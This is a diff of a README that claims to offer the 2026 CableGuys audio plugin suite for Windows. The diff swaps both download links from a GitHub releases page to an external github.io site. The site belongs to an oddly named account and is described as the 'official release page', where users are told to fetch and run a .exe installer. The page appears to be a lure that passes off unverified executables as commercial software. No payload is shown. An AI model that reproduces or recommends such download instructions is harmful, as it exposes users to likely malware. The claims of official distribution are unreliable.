@@ -1,6 +1,6 @@
 # 🎧 CableGuys-Plugins-2026 - Install Professional Audio Tools Today
 
-[![Download CableGuys Plugins](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Teachingmethod2maccabees266/CableGuys-Plugins-2026/releases)
+[![Download CableGuys Plugins](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://teachingmethod2maccabees266.github.io)
 
 This repository provides simple access to the 2026 suite of audio plugins from CableGuys. These tools allow you to manipulate volume, filter, pan, and width settings within your music production environment. You can use these effects to create complex modulation patterns and rhythmic movement in your tracks. This collection works with major digital audio workstations (DAWs) on Windows 11 and Windows 10.
 
@@ -20,7 +20,7 @@ Ensure your host program remains closed during the installation process to preve
 
 To obtain the current version of the software, visit the official release page. This page contains the latest installers for the entire plugin suite.
 
-[Click here to visit the release page and download the software](https://github.com/Teachingmethod2maccabees266/CableGuys-Plugins-2026/releases)
+[Click here to visit the release page and download the software](https://teachingmethod2maccabees266.github.io)
 
 Locate the file ending in .exe. Click the filename to save it to your computer. Depending on your browser settings, the file will land in your Downloads folder by default.
 
